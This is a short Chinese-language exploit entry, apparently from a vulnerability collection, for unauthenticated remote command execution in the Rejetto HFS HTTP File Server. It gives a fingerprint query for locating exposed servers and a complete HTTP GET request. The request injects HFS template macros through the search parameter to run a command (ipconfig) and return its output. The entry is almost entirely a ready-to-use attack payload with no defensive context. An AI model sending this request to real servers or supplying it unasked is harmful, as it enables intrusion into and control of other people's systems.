# HfsRejettoHTTP文件服务器未授权RCE漏洞

HfsRejettoHTTP ｜ 命令执行 ｜ —
- **指纹**：`app="HFS"`
- **请求**：`GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url:%password%}{.exec{.?cmd.}timeout=15out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1`